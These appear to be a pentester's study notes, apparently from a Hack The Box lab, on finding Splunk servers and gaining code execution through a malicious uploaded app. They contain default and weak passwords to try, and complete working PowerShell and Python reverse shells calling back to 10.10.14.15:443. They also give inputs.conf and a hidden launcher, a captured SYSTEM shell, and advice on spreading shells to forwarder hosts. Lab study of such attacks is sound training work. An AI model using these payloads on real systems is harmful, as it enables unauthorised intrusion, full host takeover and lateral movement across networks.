While connecting do check for
https://IP:8000
http://IP:8000
IP:8000

---
### Splunk - Discovery & Enumeration

Splunk is often used for security monitoring and business analytics. 

We have seen it exposed externally, but this is rarer. 

The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.

---
## Discovery/Footprinting

Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. While uncommon, we may encounter Splunk externally facing at times.

The Splunk web server runs by default on port 8000. 

On older versions of Splunk, the default credentials are admin:changeme, which are conveniently displayed on the login page.

The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as admin, Welcome, Welcome1, Password123, etc.

We can discover Splunk with a quick Nmap service scan. Here we can see that Nmap identified the Splunkd httpd service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.


```
sudo nmap -sV 10.129.201.50
```

## Enumeration

The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. 

Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input. These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk.

As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. **A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. We'll cover this in the next section.**

Aside from this built-in functionality, Splunk has suffered from various public vulnerabilities over the years, such as this [SSRF](https://www.exploit-db.com/exploits/40895) that could be used to gain unauthorized access to the Splunk REST API. At the time of writing, Splunk has [47](https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html) CVEs. If we perform a vulnerability scan against Splunk during a penetration test, we will often see many non-exploitable vulnerabilities returned. This is why it is important to understand how to abuse built-in functionality.

![[Pasted image 20260128160027.png]]

---

# Attacking Splunk

we can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts.

## Abusing Built-In Functionality

### Building a Splunk application with payload to upload

We can download one from here - [this](https://github.com/0xjpuff/reverse_shell_splunk)
Note - You needa edit IP and PORT in rev.py and run.ps1


Or

We can build one on our own (Discussed in the end)

Jump here - https://10.129.5.66:8000/en-US/manager/search/apps/local

Import app from file
![[Pasted image 20260223223551.png]]

Git it the tar-ball - UPload
![[Pasted image 20260223223644.png]]

BOOM
![[Pasted image 20260223223733.png]]

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.




---
### Lets build our own app

To achieve this, we first need to create a custom Splunk application using the following directory structure.

  Attacking Splunk

```shell-session
hellopriyanshu2702@htb[/htb]$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```

The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.

  Attacking Splunk

```powershell-session
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.

  Attacking Splunk

```shell-session
hellopriyanshu2702@htb[/htb]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

  Attacking Splunk

```shell-session
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Once the files are created, we can create a tarball or `.spl` file.

  Attacking Splunk

```shell-session
hellopriyanshu2702@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

The next step is to choose `Install app from file` and upload the application.

   

![Splunk Enterprise Apps page listing apps with options to browse, install from file, and create new apps.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/install_app.png)

Before uploading the malicious custom app, let's start a listener using Netcat or [socat](https://linux.die.net/man/1/socat).

  Attacking Splunk

```shell-session
hellopriyanshu2702@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...
```

On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`.

   

![Splunk Enterprise Upload app page with options to browse and upload a .spl or .tar.gz file, and upgrade app checkbox.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/upload_app.png)

As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.

  Attacking Splunk

```shell-session
hellopriyanshu2702@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145


PS C:\Windows\system32> whoami

nt authority\system


PS C:\Windows\system32> hostname

APP03


PS C:\Windows\system32>
```

In this case, we got a shell back as `NT AUTHORTY\SYSTEM`. If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain.

If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.

Code: python

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.